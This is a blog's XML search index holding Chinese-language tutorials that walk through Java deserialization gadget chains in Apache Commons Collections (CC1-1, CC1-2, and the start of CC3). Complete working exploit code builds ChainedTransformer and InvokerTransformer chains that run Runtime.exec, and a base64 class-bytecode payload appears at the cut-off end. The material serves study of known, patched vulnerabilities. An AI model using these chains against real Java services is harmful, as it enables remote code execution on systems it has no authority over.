<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0、为什么需要利用链？</title>
    <url>/2023/08/25/0%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%9F/</url>
    <content><![CDATA[# 问：为什么需要利用链？
```
import java.io.Serializable;

public class test implements Serializable {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}


```
```
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class test1 {
    public static void main(String[] args) {
        
        test t = new test();
        
        try {
            FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
            ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
            xlh.writeObject(t);
            xlh.close();
            fileOutputStream.close();

            FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
            ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
            fxlh.readObject();
            fxlh.close();
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```
序列化后，删除序列化的操作，只留下反序列化操作
```
import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class test1 {
    public static void main(String[] args) {
        try {
            FileInputStream fileInputStream = new FileInputStream("calc.ser");
            ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
            fxlh.readObject();
            fxlh.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```
效果：
![](https://s3.hedgedoc.org/demo/uploads/85997e54-dd99-4510-bdd2-bafb34b746c3.png)

这样在没有用利用链的i情况下，直接将命令执行代码放入static模块中，反序列化的时候直接触发，所以为什么要用利用链？

# 答：那是你操作不对
首先按照你的操作，建一个test和一个test1类，代码都直接用你的

![](https://s3.hedgedoc.org/demo/uploads/22b6483c-6d71-4612-90db-dc83b66058c2.png)

![](https://s3.hedgedoc.org/demo/uploads/bcfb1589-a40a-4b2f-88cd-e2ea3fc2fe51.png)

序列化后，把序列化的操作删除，再把test类删除

![](https://s3.hedgedoc.org/demo/uploads/2b4f4f7b-0b33-4255-9d41-eaf9618fb74c.png)

欸，运行不弹计算器了，为啥呢

因为你定义的test类不是自带的，是你自定义的，在反序列化的时候找不到你的test类，自然会反序列化失败啦

你弹计算器是因为你并没有删除test类，反序列化的时候找得到，当然会弹

但是在实际的环境中，除非有内鬼，不然谁会把你的test类给你写在上面，所以就需要利用链

over]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>1、CC1-1</title>
    <url>/2023/08/25/1%E3%80%81CC1-1/</url>
    <content><![CDATA[
# CC1-1
## 简述
Apache Commons Collections 中提供了一个 Transformer 的类，这个接口的功能就是将一个对象转换为另外一个对象，CC 链都依赖于此。
## 利用版本
jdk8u71 以前（8u71 开始往后已修复不可利用）&& Commons-Collections 3.1-3.2.1
## 原理
主要问题还是出现在Transformer接口的各个实现类中
## CC1-1 Demo
这里直接上前辈的demo
```

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("xxdf", "xxxx");
    }
}
```
效果：

![](https://s3.hedgedoc.org/demo/uploads/39b604b4-e1d8-4feb-ba4d-2afda20187aa.png)

下面就根据Demo分析一下
### Transformer实现类分析
#### ConstantTransformer
实现了Transformer、Serializable两条接口

![](https://s3.hedgedoc.org/demo/uploads/cacf5d87-195d-4c4f-a960-d80f7d8d6ad2.png)

重写了Transformer.transform()方法，作用是不论输入什么对象，都输出iConstant这个成员变量的值

![](https://s3.hedgedoc.org/demo/uploads/29503fe1-dba7-407b-a27a-8bcd4a848feb.png)

成员变量iConstant的值可控，可通过实例化ConstantTransformer对象进行赋值；构造方法为public所修饰，可以直接new或者调用getInstance()方法实例化

![](https://s3.hedgedoc.org/demo/uploads/717aa42b-d15a-4669-b1e1-7135e80f976b.png)

#### InvokerTransformer
实现了Transformer、Serializable两条接口

![](https://s3.hedgedoc.org/demo/uploads/a443741f-86b4-4659-9f4d-236c9634cd87.png)

重写了Transformer.transform()方法，作用是传入一个对象，然后调用对象中指定的方法，但是需要方法的方法名（iMethodName）、参数类型（iParamTypes），参数值（iArgs）

![](https://s3.hedgedoc.org/demo/uploads/20d27c6e-3c3e-4d24-8268-9e1884d81f47.png)

不过这三个都可以通过构造方法实例化时候传入赋值

![](https://s3.hedgedoc.org/demo/uploads/e92d13b5-58ac-4a4b-8f3b-cb7d59de75dc.png)

#### ChainedTransformer
实现了Transformer、Serializable两条接口

![](https://s3.hedgedoc.org/demo/uploads/d2f32437-24dc-4612-9cc4-c61823fec322.png)

重写了Transformer.transform()方法，作用是传入一个对象，循环调用Transformer[]对象中的每一个Transformer.transform()方法，且前一个对象（传入的对象）是后一个对象的参数，最后输出结果对象

![](https://s3.hedgedoc.org/demo/uploads/50bee9df-d137-4b5e-a6a2-4639cba2a87e.png)

上面的话看起来可能有点难抽象理解啊，我们写个测试代码

```
public class Test {

    private final int[] iTransformers = {1,2,3,4,5};
    public int transform(int num1) {
        for(int i = 0; i < iTransformers.length; i++) {
            num1 = num1 + i;
        }
        return num1;
    }

    public static void main(String[] args) {
        Test test = new Test();
        int num = test.transform(6);
        System.out.println(num);
    }
}
```

只是把循环调用Transformer.transform()方法改成了循环调用num1 + 1而已，这个把参数带入一下就好理解了
#### TransformedMap
继承AbstractInputCheckedMapDecorator类，实现了Serializable接口

![](https://s3.hedgedoc.org/demo/uploads/77a99386-8e67-44cf-a415-d4f80b64da3f.png)

往上回溯父类，其实也实现了Map接口

![](https://s3.hedgedoc.org/demo/uploads/8d04eee1-3822-4864-8485-83b880307c68.png)

![](https://s3.hedgedoc.org/demo/uploads/cfabdf8b-0ae9-4e65-a21f-e12dfecaddd3.png)

构造方法为protected所修饰，不同包的类无法通过new进行实例化

![](https://s3.hedgedoc.org/demo/uploads/1d285b29-61ee-4ee3-8ffb-dc6486eeb61c.png)

不过可以通过静态方法decorate进行实例化

![](https://s3.hedgedoc.org/demo/uploads/fa493e57-232a-4f34-861f-6d303ef13ec5.png)
### 整体分析
回到demo中，触发计算器的点在TransformedMap.put("xxdf", "xxxx")中（你不信把outerMap.put("xxdf", "xxxx")删了看看还弹不弹计算器），我们直接跟进TransformedMap.put()

![](https://s3.hedgedoc.org/demo/uploads/24513aae-afb5-4455-88fe-d763af72ddff.png)

调用了transformKey()和transformValue()两个方法，继续跟进

![](https://s3.hedgedoc.org/demo/uploads/792d375c-6586-4f39-8964-f8c43c0a48f6.png)

![](https://s3.hedgedoc.org/demo/uploads/3874d4dc-1a40-4ad6-92ae-0e52ce444eac.png)

都调用了transform()方法，而keyTransformer和valueTransformer这两个成员变量其实都是Transformer对象

![](https://s3.hedgedoc.org/demo/uploads/51cc4b28-05cb-4dbd-b018-e31d0af17784.png)

所以到这儿就破案了，只要调用put方法就能触发Transformer.transformer()

我们再回到TransformedMap.decorate()方法，调用这个方法实例化的TransformedMap对象其实也是Map对象

现在，就需要找一个实现了Serializable接口的类，并在重写的readObject()方法的中调用了Map.put()方法

这样，就能在反序列化的时候直接调用TransformedMap.put()方法

### 序列化实现
最终，前辈们找到了sun.reflect.annotation.AnnotationInvocationHandler类，我们跟进
AnnotationInvocationHandler实现了Serializable接口

![](https://s3.hedgedoc.org/demo/uploads/55d922a7-447b-4900-b154-e77779eade02.png)

并重写了readObject()方法，稍微分析一下

![](https://s3.hedgedoc.org/demo/uploads/4f4c2db6-0672-49f6-aca7-7dcb453a8ca5.png)

1. 获取memberValues这个成员变量中的键值对条目的集合，然后放在迭代器上，最后赋值给var4
2. 判断var7是否为null，如果不为null，则进入下面的代码逻辑
3. 判断var8是否不为var7的实例对象，并且判断var8是否不为ExceptionProxy的子类或者对象，如果同时满足这两个条件则进入下面的代码逻辑
4. 最后调用var5.setValue（var5为Map对象），间接触发Map.put()方法

333行中的memberValues这个成员变量，是Map对象，是在AnnotationInvocationHandler类实例化的时候赋值的，需要传入一个Annotation接口的实现对象和一个Map对象

![](https://s3.hedgedoc.org/demo/uploads/09f65eb4-00bb-4511-8322-f34ade0ec4a1.png)

Annotation接口的实现对象好找啊，直接选中Annotation接口然后Ctrl + H查看

![](https://s3.hedgedoc.org/demo/uploads/7585eb42-5e07-4033-bc06-3142e1b1812f.png)

一堆，我们也不挑，这里直接用第一个NamedArg

需要的Map对象也好办，就是上面的TransformedMap类

所以就简单了，我们直接在上面的demo的继承上改进

```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javafx.beans.NamedArg;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        //获取AnnotationInvocationHandler对象
        Class classz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = classz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(NamedArg.class, outerMap);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(o);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();
    }
}

```
效果：

![](https://s3.hedgedoc.org/demo/uploads/30ee9195-1060-44ab-93c4-244c3a234bd1.png)

出现了问题，是序列化时候出现问题，原因是Runtime对象并没有实现Serializable接口

![](https://s3.hedgedoc.org/demo/uploads/33b1ccfb-b4f3-4a9f-aedf-116f67543e0a.png)

但是Class对象实现了Serializable接口，我们可以从Runtime.class中获取Runtime对象

![](https://s3.hedgedoc.org/demo/uploads/a204238d-071e-4234-a654-dcbe78566bc2.png)

修改代码如下：
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javafx.beans.NamedArg;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                //从Runtime.class中获取Runtime对象
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        //获取AnnotationInvocationHandler对象
        Class classz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = classz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(NamedArg.class, outerMap);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(o);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();
    }
}
```
效果：

![](https://s3.hedgedoc.org/demo/uploads/55d6d47f-a0f6-4785-a7bf-1190e925fc10.png)

并没有弹出计算器

我操？

既然没有弹计算器，那就是反序列化的那一步出了问题，直接在AnnotationInvocationHandler.readObject()方法那里打一个断点，调试一下

![](https://s3.hedgedoc.org/demo/uploads/a2c5dcb4-80b2-4b29-9326-bdfcd4430346.png)

![](https://s3.hedgedoc.org/demo/uploads/acc22d1f-b8de-4621-a146-d4395c9ea504.png)

这里成员变量memberValues没有被赋值（size=0）

那就是AnnotationInvocationHandler在实例化的时候的问题，再在AnnotationInvocationHandler的构造方法打个断点调试看看

![](https://s3.hedgedoc.org/demo/uploads/37fe7d6c-0af0-4179-ab0c-25b9c6d5173b.png)

Annotation的实现类没有问题，问题出在var2上面

var2就是我们传入的TransformedMap类，但是这里显示size=0，说明没有键值，自然而然赋不了值，所以需要赋值，这里我们随便赋值意思意思

![](https://s3.hedgedoc.org/demo/uploads/4a0ca52a-da7e-4c99-8533-c0b5e79aa629.png)

再调试

![](https://s3.hedgedoc.org/demo/uploads/9901dd74-22ac-4008-a09b-081f599ce0f8.png)

欧克，可以了

但是调试进入到readObject的代码逻辑的时候，又出问题了

![](https://s3.hedgedoc.org/demo/uploads/c378c88f-d240-4755-b543-22d44ef5569a.png)

此时的var7的值为null，但是这样进不去下面的var5.setValue()了呀！那还搞个屁，所以还是得分析一下上面的代码

![](https://s3.hedgedoc.org/demo/uploads/22e85c5b-1287-44b1-b8d5-ceb398eeb70e.png)

var7来自于var3，var3是个Map对象，查看var3

![](https://s3.hedgedoc.org/demo/uploads/d6291150-d610-4aac-86d0-366111a41e10.png)

此时的var3的有两个键值，一个是"value":"class java.lang.String"，一个是"defaultValue":"class java.lang.String"

有没有觉得很眼熟，这不就是传进入的NamedArg接口的两个方法吗？！

键就是方法名，值就是方法的返回值

![](https://s3.hedgedoc.org/demo/uploads/e5b88376-0cea-4804-9672-8f49794073f4.png)

回到反序列化代码

![](https://s3.hedgedoc.org/demo/uploads/cc7e92e4-3239-41de-9760-e607dbe3c0a8.png)

var7定义的那一行代码中，get()方法的作用是根据键取值，而我们var3的键为"value"和"defaultValue"，这里传入的键为"111"，var3里面根本没有111这个键，结果当然是null

这里写一个测试代码：
```
import java.util.HashMap;
import java.util.Map;

public class test {
    public static void main(String[] args) {
        Map var3 = new HashMap<>();
        var3.put("value",String.class);
        var3.put("defaultValue",String.class);
        Class o = (Class) var3.get("111");
        System.out.println(o);
    }
}

```
![](https://s3.hedgedoc.org/demo/uploads/157bf4ab-53fd-4ade-a038-11ec3d271f73.png)

所以，"111"来自哪里？向上分析，其实就来自于TransformedMap类，在上面我们给它的赋值

我们将"111"改为"value"，然后调试

![](https://s3.hedgedoc.org/demo/uploads/a0689014-5e76-4906-823c-482c7830dc37.png)

![](https://s3.hedgedoc.org/demo/uploads/0d5c3530-0884-48cf-946a-05d320e46f9f.png)

很好，var7不为空，var7值是"class java.lang.String"了，我们继续调试，顺利进入到下面的代码逻辑

不过又出问题了，根据下面代码逻辑，必须满足下面if语句中的两个代码逻辑才可以进入var5.setValue()，此时的var8是"222"，是var7的值 class java.lang.String的实例对象，所以不会进入var5.setValue()

![](https://s3.hedgedoc.org/demo/uploads/fa6022e0-3b63-423f-97dc-da86fca5fa09.png)

也就是说，var8或者var7需要改下才可以进入到下面的var.setValue
1. 要么var8不为class java.lang.String的实例对象
2. 要么var7不为class java.lang.String

### 修改var8
这里的var8为"222"，其实就是我们设定的TransformedMap的值

![](https://s3.hedgedoc.org/demo/uploads/b44a421d-0756-4408-9d76-08ed39e1f365.png)

我们给它改成数字111，这样var8就不是class java.lang.String的实例对象了，最后我们修改后直接运行

![](https://s3.hedgedoc.org/demo/uploads/6cb084ab-a948-472a-8631-8bebca496581.png)

很好，直接弹出计算器
### 修改var7
上面说到，var7来自于var3的键与值中的值的Class对象，var3其实就是获取到AnnotationInvocationHandler实例对象时候，我们传入的Annotation的实现类（这里我们传入的是NamedArg接口）中的方法和(Class)返回值

![](https://s3.hedgedoc.org/demo/uploads/f13c9658-3c6d-4dcd-a2c7-1d0200f91236.png)

![](https://s3.hedgedoc.org/demo/uploads/63478ca5-0c75-4612-92b3-4aaa7c1b1b71.png)

而我们传入的TransformedMap类的键其实就是var3的键

![](https://s3.hedgedoc.org/demo/uploads/2628678a-fa05-4816-9671-e8cabdcb0fc2.png)

所有要改var7，就只有换一个Annotation的实现类，这里我们选Addressing，它三个方法的(class)返回值都不是java.lang.String，所以随便哪个方法都可以，这里我们选required

![](https://s3.hedgedoc.org/demo/uploads/3d5dab3c-1d52-419a-b077-61492ba93a1b.png)

这里我们将传入的Annotation的实现类改为Addressing，TransformedMap的键改为"required"，最后运行

![](https://s3.hedgedoc.org/demo/uploads/e794025c-c2bd-43bf-8f06-e4fbf6fae44b.png)

弹出计算器，结束

## 完整代码
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javafx.beans.NamedArg;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                //从Runtime.class中获取Runtime对象
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value",111);
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        //获取AnnotationInvocationHandler对象
        Class classz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = classz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(NamedArg.class, outerMap);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(o);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();
    }
}

```

## 学习
https://fireline.fun/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/#0x02-P%E7%89%9B%E7%AE%80%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BEDemo%E5%88%86%E6%9E%90

https://xz.aliyun.com/t/9409


]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>2、CC1-2</title>
    <url>/2023/08/25/2%E3%80%81CC1-2/</url>
    <content><![CDATA[
# CC1-2
## 简述
此链是在CC1-1的基础上进行分析与修改
## 前置知识
{% post_link 动态代理 %}
## 利用版本
jdk8u71 以前（8u71 开始往后已修复不可利用）&& Commons-Collections 3.1-3.2.1
## CC1-2 Demo
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_2 {

    public static void main(String[] args) throws Exception{

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //反射获取AnnotationInvocationHandler实例
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        //动态代理类，设置一个D代理对象，为了触发 AnnotationInvocationHandler#invoke           
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

        InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(handler1);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```
## 分析
直接看demo

![](https://s3.hedgedoc.org/demo/uploads/5b7e4275-3207-498f-9532-41b5e0af79bf.png)

可以看出，cc1-2用了动态代理，而被代理的类，就是sun.reflect.annotation.AnnotationInvocationHandler

我们分析一波sun.reflect.annotation.AnnotationInvocationHandler，它实现了InvocationHandler接口

![](https://s3.hedgedoc.org/demo/uploads/b07978de-eb33-4be5-b856-b10b26689267.png)

重写了invoke()方法，并在第59行调用了this.memberValues.get(var4)

![](https://s3.hedgedoc.org/demo/uploads/1ddca427-bb59-4b09-b7ff-4d30470bfcb8.png)

成员变量memberValues是一个Map对象，通过构造方法赋值

![](https://s3.hedgedoc.org/demo/uploads/b9bf03ae-2748-46d8-83d0-2b47a99c5083.png)

总的来说，AnnotationInvocationHandler的代理类在反序列化的时候必定会调用了AnnotationInvocationHandler.invoke()方法，进而调用Map.get()方法

继续分析，成员变量memberValues被赋予的值其实是LazyMap对象，这就说明，在反序列化的时候，就会调用LazyMap.get()方法，我们跟进LazyMap.get()方法

![](https://s3.hedgedoc.org/demo/uploads/136c59e1-5204-4334-b7cb-8b44381817cd.png)

LazyMap.get()方法中，成员变量factory其实就是Transformer对象

![](https://s3.hedgedoc.org/demo/uploads/bca218a8-f319-4657-9427-71fd31a3635b.png)

而LazyMap.decorate()方法其实和cc1中的TransformedMap.decorate()是异曲同工之妙，都是将Transformer对象转化成Map对象

再往上面看，其实代码都一样

![](https://s3.hedgedoc.org/demo/uploads/781a96de-e907-485a-80f3-afaa43fa2b3e.png)

![](https://s3.hedgedoc.org/demo/uploads/c45ff784-0aa2-4609-b8f2-5391f4d6e10a.png)

所以cc1-2和cc1-1的相差不大

## 完整代码
```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_2 {

    public static void main(String[] args) throws Exception{

        //Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        //ChainedTransformer实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        //LazyMap实例
        Map uselessMap = new HashMap();
        Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer);

        //反射获取AnnotationInvocationHandler实例
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        //动态代理类，设置一个D代理对象，为了触发 AnnotationInvocationHandler#invoke
        Map mapProxy = (Map) Proxy.newProxyInstance(
                LazyMap.class.getClassLoader(),
                LazyMap.class.getInterfaces(),
                handler);

        InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy);
        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
        xlh.writeObject(handler1);
        xlh.close();
        fileOutputStream.close();

        //反序列化
        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\url.ser");
        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
        fxlh.readObject();
        fxlh.close();

    }

}

```

## 总结
cc1-1通过 AnnotationInvocationHandler 类触发 TransformedMap 的 put 方法

![](https://s3.hedgedoc.org/demo/uploads/f3e0523f-f228-4f93-a9b3-de99c566e3cc.png)

而cc1-2则是通过通过 AnnotationInvocationHandler 类触发 LazyMap 的 get 方法

![](https://s3.hedgedoc.org/demo/uploads/6df76d17-db3d-442c-96e7-37fdf59c309a.png)

## 学习
https://fireline.fun/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/#0x02-P%E7%89%9B%E7%AE%80%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BEDemo%E5%88%86%E6%9E%90

https://xz.aliyun.com/t/9409












]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>利用链</tag>
      </tags>
  </entry>
  <entry>
    <title>3、CC3</title>
    <url>/2023/08/25/3%E3%80%81CC3/</url>
    <content><![CDATA[# CC3
## 前置知识
{% post_link TemplatesImpl %}

{% post_link 动态代理 %}
## 利用版本
jdk8u71 以前（8u71 开始往后已修复不可利用，这里用的是jdk8u66）&& Commons-Collections 3.1-3.2.1
## CC3 Demo
```
public class CommonsCollections3 {

    public static void main(String[] args) {

        try{
            //字节码
            byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW